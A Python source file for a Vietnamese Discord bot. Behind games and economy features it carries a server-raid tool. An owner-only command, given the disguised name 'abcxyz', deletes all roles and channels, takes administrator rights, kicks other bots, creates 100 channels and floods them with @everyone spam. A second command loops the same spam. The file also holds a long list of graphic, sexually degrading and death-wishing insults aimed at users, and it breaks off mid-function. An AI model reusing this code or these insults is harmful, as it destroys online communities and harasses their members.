import asyncio
import os
import sys
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime, timezone
import json
import math

# ==================== KEEP_ALIVE (nếu dùng) ====================
try:
    from keep_alive import keep_alive
except ImportError:
    def keep_alive():
        pass

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
1540585511842881616,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.bans = True
intents.moderation = True
intents.webhooks = True

def get_prefix(bot, message):
    prefixes = ('n!', 'N!', 'n! ', 'N! ')
    for p in prefixes:
        if message.content.startswith(p):
            return p
    return 'n! '  # fallback

bot = commands.Bot(command_prefix=get_prefix, intents=intents)
bot.remove_command('help')

# ==================== BIẾN TOÀN CỤC ====================
spam_task_running = None
is_spamming = False
bot_enabled = True

SERVER_LOG_CHANNELS = {}
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}
SERVER_LEVEL_CHANNELS = {}
DISABLED_COMMANDS = set()

# Dữ liệu người dùng
USER_LEVELS = {}
user_coins = {}
user_inventory = {}
marriages = {}
daily_cooldowns = {}

# Đường dẫn file JSON
LEVEL_FILE = "levels.json"
CONFIG_FILE = "config.json"
COIN_FILE = "coins.json"
INVENTORY_FILE = "inventory.json"
MARRIAGE_FILE = "marriages.json"
DAILY_FILE = "daily.json"

# ==================== TẢI / LƯU DỮ LIỆU ====================
def load_json(file, default={}):
    try:
        with open(file, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default

def save_json(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_all_data():
    global USER_LEVELS, user_coins, user_inventory, marriages, daily_cooldowns, SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS, DISABLED_COMMANDS
    USER_LEVELS = load_json(LEVEL_FILE, {})
    user_coins = load_json(COIN_FILE, {})
    user_inventory = load_json(INVENTORY_FILE, {})
    marriages = load_json(MARRIAGE_FILE, {})
    daily_cooldowns = load_json(DAILY_FILE, {})
    config = load_json(CONFIG_FILE, {})
    SERVER_LOG_CHANNELS = config.get("log_channels", {})
    WELCOME_CHANNELS = config.get("welcome_channels", {})
    GOODBYE_CHANNELS = config.get("goodbye_channels", {})
    SERVER_LEVEL_CHANNELS = config.get("level_channels", {})
    BOT_OWNERS = config.get("owners", BOT_OWNERS)
    DISABLED_COMMANDS = set(config.get("disabled_commands", []))

def save_all_data():
    save_json(LEVEL_FILE, USER_LEVELS)
    save_json(COIN_FILE, user_coins)
    save_json(INVENTORY_FILE, user_inventory)
    save_json(MARRIAGE_FILE, marriages)
    save_json(DAILY_FILE, daily_cooldowns)
    config = {
        "log_channels": SERVER_LOG_CHANNELS,
        "welcome_channels": WELCOME_CHANNELS,
        "goodbye_channels": GOODBYE_CHANNELS,
        "level_channels": SERVER_LEVEL_CHANNELS,
        "owners": BOT_OWNERS,
        "disabled_commands": list(DISABLED_COMMANDS)
    }
    save_json(CONFIG_FILE, config)

load_all_data()

# ==================== HẰNG SỐ GIAO DIỆN ====================
CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/0b/5c/dd/0b5cddb5352ae325e8bcbd8ae8d448f9.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/7c/12/72/7c12727320e9107bd656c581af98067f.gif"
NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"
HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/56/00/5a/56005a1acfe12d3df3e97c646d81b561.gif"

ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn giải nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ giải thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn giải nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ giải nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn giải thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn giải chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀",
]

# ==================== HÀM TIỆN ÍCH ====================
def get_required_exp(level: int) -> int:
    return level * 100

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

def add_coins(user_id, amount):
    uid = str(user_id)
    user_coins[uid] = user_coins.get(uid, 0) + amount
    save_json(COIN_FILE, user_coins)

def subtract_coins(user_id, amount):
    uid = str(user_id)
    cur = user_coins.get(uid, 0)
    if cur < amount:
        return False
    user_coins[uid] = cur - amount
    save_json(COIN_FILE, user_coins)
    return True

def get_user_level(user_id):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
        save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

def add_exp(user_id, exp):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
    USER_LEVELS[uid]["exp"] += exp
    lv = USER_LEVELS[uid]["level"]
    while USER_LEVELS[uid]["exp"] >= get_required_exp(lv):
        USER_LEVELS[uid]["exp"] -= get_required_exp(lv)
        USER_LEVELS[uid]["level"] += 1
        lv += 1
    save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

async def send_log(guild_id, embed):
    for gid, chid in SERVER_LOG_CHANNELS.items():
        if int(gid) == guild_id:
            channel = bot.get_channel(chid)
            if channel:
                try:
                    await channel.send(embed=embed)
                except:
                    pass

async def check_and_assign_level_roles(member: discord.Member, current_level: int):
    role_permissions_map = {
        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
    }
    for req_lv, r_data in role_permissions_map.items():
        if current_level >= req_lv:
            role = discord.utils.get(member.guild.roles, name=r_data["name"])
            if not role:
                try:
                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
                except:
                    continue
            if role and role not in member.roles:
                try:
                    await member.add_roles(role)
                except:
                    pass

# ==================== DECORATOR OWNER ====================
def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== VIEW XÁC NHẬN NUKE ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"❌ Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        await send_log(guild.id, nuke_log_embed)

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
            chunk_size = 10
            for i in range(0, len(bot_members), chunk_size):
                chunk = bot_members[i:i + chunk_size]
                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        channels_to_delete = list(guild.channels)
        for i in range(0, len(channels_to_delete), 15):
            batch = channels_to_delete[i:i+15]
            del_tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*del_tasks, return_exceptions=True)
            await asyncio.sleep(1.0)

        created_channels = []
        for i in range(0, 100, 60):
            batch_create = []
            for j in range(i, min(i + 60, 100)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch_create.append(guild.create_text_channel(name=channel_name))
            res = await asyncio.gather(*batch_create, return_exceptions=True)
            for r in res:
                if isinstance(r, discord.TextChannel):
                    created_channels.append(r)
            await asyncio.sleep(2.0)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
        )

        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        for _ in range(10):
            batch_spam = []
            for _ in range(250):
                ch = random.choice(valid_channels) if valid_channels else None
                if ch:
                    async def send_fast(c=ch):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await c.send(spam_content, embed=embed)
                        except:
                            pass
                    batch_spam.append(send_fast())
            if batch_spam:
                await asyncio.gather(*batch_spam, return_exceptions=True)
            await asyncio.sleep(1.0)

        complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
        await send_log(guild.id, complete_log_embed)

    except Exception as e:
        print(f"Lỗi khi thực hiện nuke: {e}")

# ==================== VIEW XÁC NHẬN RESTORE ====================
class RestoreConfirmView(discord.ui.View):
    def __init__(self, ctx, backup_data, filename):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.backup_data = backup_data
        self.filename = filename

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="✅ ĐỒNG Ý RESTORE", style=discord.ButtonStyle.green)
    async def confirm_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⏳ Đang khôi phục server...", ephemeral=True)
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await restore_process(self.ctx, self.backup_data, self.filename)

    @discord.ui.button(label="❌ HỦY", style=discord.ButtonStyle.red)
    async def cancel_restore(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message("❌ Đã hủy lệnh restore.", ephemeral=True)
        self.stop()

async def restore_process(ctx, backup_data, filename):
    try:
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        for role_data in backup_data.get("roles", []):
            perms = discord.Permissions(role_data["permissions"])
            try:
                color_hex = role_data.get("color", "#000000")
                if color_hex.startswith("#"):
                    color = discord.Color(int(color_hex.strip("#"), 16))
                else:
                    color = discord.Color.default()
            except:
                color = discord.Color.default()
            try:
                await guild.create_role(
                    name=role_data["name"],
                    permissions=perms,
                    color=color,
                    hoist=True
                )
            except:
                pass
        for channel_data in backup_data.get("channels", []):
            name = channel_data["name"]
            ctype = channel_data["type"]
            position = channel_data.get("position", 0)
            try:
                if ctype == "text":
                    await guild.create_text_channel(name=name, position=position)
                elif ctype == "voice":
                    await guild.create_voice_channel(name=name, position=position)
            except:
                pass
        embed = discord.Embed(
            title="✅ ĐÃ RESTORE SERVER",
            description=f"🎉 Server **{guild.name}** đã được khôi phục từ file `{filename}`.",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống restore Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi restore: {str(e)}")

# ==================== LỆNH PHÁ HOẠI (đã đổi tên) ====================
@bot.command(name="abcxyz")
@is_bot_owner()
async def abcxyz(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    confirm_embed = discord.Embed(
        title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
        description=(
            f"🔥 **Kính chào Boss Bảo!**\nBạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
            f"Vui lòng kiểm tra kỹ và bấm nút bên dưới để quyết định:\n"
            f"• 🟢 **Đồng ý:** Bot sẽ check server và tiến hành xả 2000 tin nhắn (20 tin/kênh).\n"
            f"• 🔴 **Từ chối:** Hủy bỏ lệnh và thông báo."
        ),
        color=0xFF0000
    )
    confirm_embed.set_footer(text="Hệ thống tối cao phục vụ Boss Bảo 💖")
    view = NukeConfirmView(ctx.guild, ctx.channel)
    try:
        await ctx.author.send(embed=confirm_embed, view=view)
        temp_notice = await ctx.send("📩 **Boss Bảo check tin nhắn riêng (DM) để xác nhận lệnh nuke nhé!**")
        await asyncio.sleep(5)
        await temp_notice.delete()
    except discord.Forbidden:
        await ctx.send("❌ Boss Bảo ơi, hãy mở DM (Tin nhắn riêng) để bot có thể gửi bảng xác nhận nuke nhé!")

@abcxyz.error
async def abcxyz_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

@bot.command(name="spam")
@is_bot_owner()
async def start_spam(ctx):
    global is_spamming, spam_task_running
    if is_spamming:
        await ctx.send("❌ Hệ thống spam đang chạy rồi!")
        return

    is_spamming = True
    await ctx.send("🚀 **ĐÃ BẮT ĐẦU SPAM!**")

    async def spam_loop():
        global is_spamming
        spam_text = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
        )
        while is_spamming:
            channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
            if not channels:
                await asyncio.sleep(1)
                continue

            tasks = []
            for _ in range(30):
                ch = random.choice(channels)
                async def send_msg(target_ch=ch):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await target_ch.send(spam_text, embed=embed)
                    except:
                        pass
                tasks.append(send_msg())

            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.3)

    spam_task_running = asyncio.create_task(spam_loop())

@start_spam.error
async def start_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
